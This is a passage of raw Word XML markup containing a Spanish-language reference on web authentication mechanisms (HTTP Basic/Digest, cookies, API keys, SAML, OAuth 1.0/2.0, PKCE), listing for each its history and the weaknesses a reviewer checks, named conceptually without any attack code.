          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  forzar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>WebSocket y gRPC (transporte de APIs modernas)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué es:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> WebSocket abre un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>canal persistente</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; gRPC usa </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>HTTP/2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Protocol Buffers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  binarios.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> WebSocket suele </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>autenticar solo al inicio</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (el token no se reevalúa por mensaje); gRPC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  suele </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ser inspeccionado por WAF/ proxy, y expone reflexión y streaming.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4.2 Autenticación HTTP clásica</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>HTTP Basic y Digest (RFC 2617 → RFC 7616)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué es:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Basic manda </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>usuario:contraseña</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Base64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (no es cifrado). Digest manda un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>hash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>nonce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Primera aparición:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> RFC 2617 (1999); actualizado por RFC 7616 (2015, con SHA-256).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Dónde vive hoy:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> autenticación de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cliente</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en OAuth (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>client_secret_basic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>), sistemas internos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Basic sobre HTTP sin TLS; credenciales en logs; reutilización en todas las llamadas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cookies de sesión (RFC 6265)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué es:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> estado que el navegador guarda y reenvía. Creadas por Netscape (1996), estandarizadas en</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  RFC 6265 (2011).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se usa acá:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el ID de sesión es, en la práctica, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>un bearer token guardado en el navegador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Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> falta de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>HttpOnly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Secure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SameSite</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; CSRF; fijación de sesión; XSS que roba la</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  cookie.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>API keys</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué es:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> un secreto estático que identifica al cliente (no al usuario).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Dónde aparece:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> servicios internos, APIs de terceros, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>.env</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y CI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> claves en repositorios y logs; sin expiración; sin permisos finos; imposibles de rotar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  sin romper todo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4.3 Federación en XML</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>WS-Security, SAML 2.0 y XML-DSig</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué es:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SAML 2.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (OASIS, 2005) transporta </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>aserciones</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de identidad firmadas; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>WS-Security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  (2004) define cómo firmar/ cifrar mensajes SOAP; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>XML-DSig</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> es la firma XML.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo funciona:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el IdP emite una aserción firmada con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Subject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Conditions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AttributeStatement</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  la app confía en el IdP y crea sesión.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>XML Signature Wrapping</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y canonicalización, aserciones sin verificar firma,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  condiciones (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>NotBefore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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>NotOnOrAfter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">) ignoradas, y el famoso </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>SAML "comment" injection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Por qué importa hoy:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> SAML sigue siendo el rey del </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SSO empresarial</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. Es XML, pesado, pero</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  probado en décadas de banca y gobierno.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4.4 OAuth y OpenID Connect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280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oken_famil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28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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Familia de tokens y flujo de emisión</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>OAuth 1.0 (RFC 5849)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Primera aparición:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> borrador dic. 2007; RFC 5849 en 2010.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo funciona:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> firma de cada request con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>HMAC-SHA1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nonce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>timestamp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Qué mirar (histórico):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> implementación frágil, relojes, secreto en el cliente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Por qué importa:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> explica </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>por qué</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OAuth 2.0 eligió la simplicidad del bearer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>OAuth 2.0 (RFC 6749) y bearer (RFC 6750)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Primera aparición:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> octubre de 2012.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo funciona:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cuatro roles (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>dueño</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cliente</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>servidor de autorización</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, **servidor de</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  recursos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>) y flujos (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
        </w:rPr>
        <w:t>grants</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">) para obtener un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>access token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, que se presenta como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>bearer**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el propio §10.3 (no se puede confirmar a quién se emitió el token); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>redirect URI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  abiertos; el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>authorization code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> reusable sin PKCE; CSRF en el callback (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>state</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ausente).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>El tipo MAC (abandonado)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Primera aparición:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> borrador de febrero de 2012; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>abandonado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Qué proponía:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> un token con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>prueba de posesión</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (el cliente demuestra que tiene una clave).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Por qué se cayó:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> complejidad de canonicalización e interoperabilidad.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Por qué importa:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> es el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>eslabón perdido</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: lo que hoy reintentan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>mTLS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>DPoP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>PKCE (RFC 7636)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Primera aparición:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2015. Obligatorio en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>authorization code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> según RFC 9700 (2025).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
